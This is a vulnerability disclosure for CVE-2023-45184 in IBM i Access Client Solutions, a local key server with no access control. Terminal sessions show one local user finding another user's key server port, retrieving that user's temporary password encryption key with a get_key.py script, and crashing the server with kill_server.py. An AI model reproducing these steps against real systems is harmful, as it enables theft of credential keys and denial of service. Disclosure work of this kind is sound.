# CVE-2023-45184
IBM i Access Client Solutions < 1.1.9.4 - Local server broken access control. 

## Timeline
- Vulnerability reported to vendor: 22.09.2023
- New fixed 1.1.9.4 version released: 08.12.2023
- Public disclosure: 15.12.2023

## Description

IBM i Access Client Solutions for storing temporary password encryption key uses a separate local server which is started on a random tcp6 port. Application retrieves this temporary encryption key without any access control. 

The local server can be easily found using the `netstat` command:
```
┌──(mkubiak㉿localhost)-[/tmp/mkubiak]
└─$ netstat -nltp | grep java
tcp6       0      0 :::34307                :::*                    LISTEN      3225094/java         off (0.00/0/0)
```

We can confirm details about this local server using the `ps` command:
```
┌──(mkubiak㉿localhost)-[/tmp/mkubiak]
└─$ ps aux | grep java
mmajchr+ 3224938  6.8  0.9 13305316 301392 pts/6 Sl+  12:30   0:17 java -jar ./acsbundle_1.9.new.jar
mmajchr+ 3225094  0.3  0.2 11512420 79692 pts/6  Sl+  12:30   0:00 /usr/lib/jvm/java-17-openjdk-amd64/bin/java -Djava.class.path=/tmp/ACS.lm13910263510749358977.jar -Dvisualvm.display.name=ACS Daemon -Dcom.ibm.tools.attach.displayName=ACS Daemon com.ibm.iaccess.base.LmHybridServerImpl
mkubiak  3238934  0.0  0.0   6464  1992 pts/12   R+   12:44   0:00 grep --color=auto java
```

We can get the temporary password encryption key from the local server started by the user `mmajchrowicz` using the `get_key.py` script from the `mkubiak` account:
```
┌──(mkubiak㉿localhost)-[/tmp/mkubiak]
└─$ id
uid=1012(mkubiak) gid=1012(mkubiak) groups=1012(mkubiak),27(sudo)

┌──(mkubiak㉿localhost)-[/tmp/mkubiak]
└─$ ./get_key.py 34307        

IBM AS400 Secret Key Recovery Tool v0.2 by Michal Majchrowicz AFINE Team

Received data len: 288
Received data in hex format: b'aced00057372001c636f6d2e69626d2e696163636573732e626173652e4c6d5265706c79000000000000000102000449000b6d5f636f6e646974696f6e4c00056d5f6578637400154c6a6176612f6c616e672f5468726f7761626c653b4c000e6d5f657874656e646564446174617400124c6a6176612f6c616e672f537472696e673b4c000b6d5f7265706c79436f64657400284c636f6d2f69626d2f696163636573732f626173652f4c6d5265706c79245265706c79436f64653b787000000000707400087a6d2f2f69637a2f7e720026636f6d2e69626d2e696163636573732e626173652e4c6d5265706c79245265706c79436f646500000000000000001200007872000e6a6176612e6c616e672e456e756d0000000000000000120000'
Received data in ascii format: b'\xac\xed\x00\x05sr\x00\x1ccom.ibm.iaccess.base.LmReply\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x04I\x00\x0bm_conditionL\x00\x05m_exct\x00\x15Ljava/lang/Throwable;L\x00\x0em_extendedDatat\x00\x12Ljava/lang/String;L\x00\x0bm_replyCodet\x00(Lcom/ibm/iaccess/base/LmReply$ReplyCode;xp\x00\x00\x00\x00pt\x00\x08zm//icz/~r\x00&com.ibm.iaccess.base.LmReply$ReplyCode\x00\x00\x00\x00\x00\x00\x00\x00\x12\x00\x00xr\x00\x0ejava.lang.Enum\x00\x00\x00\x00\x00\x00\x00\x00\x12\x00\x00'

Secret key: zm//icz/
                                                                                                                                                                                       
┌──(mkubiak㉿localhost)-[/tmp/mkubiak]
└─$
```

We can kill the local server started by the `mmajchrowicz` user using the `kill_server.py` script from the `mkubiak` account:
```
┌──(mkubiak㉿localhost)-[/tmp/mkubiak]
└─$ id
uid=1012(mkubiak) gid=1012(mkubiak) groups=1012(mkubiak),27(sudo)

┌──(mkubiak㉿localhost)-[/tmp/mkubiak]
└─$ ./kill_server.py 34307

IBM AS400 Access Client Credentials Server DoS Tool v0.2 by Michal Majchrowicz AFINE Team

Error: [Errno 104] Connection reset by peer

Credentials server seems to be dead :)



┌──(mkubiak㉿localhost)-[/tmp/mkubiak]
└─$ netstat -nltp | grep 34307
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)


┌──(mkubiak㉿localhost)-[/tmp/mkubiak]
└─$
```

This problem was caused by a lack of request source access control. This issue is fixed in IBM i Access Client Solutions 1.1.9.4.

## Affected versions
< 1.1.9.4

## Advisory
Update IBM i Access Client Solutions to 1.1.9.4 or newer.

### References
* https://www.ibm.com/support/pages/node/7091942
* https://nvd.nist.gov/vuln/detail/CVE-2023-45184
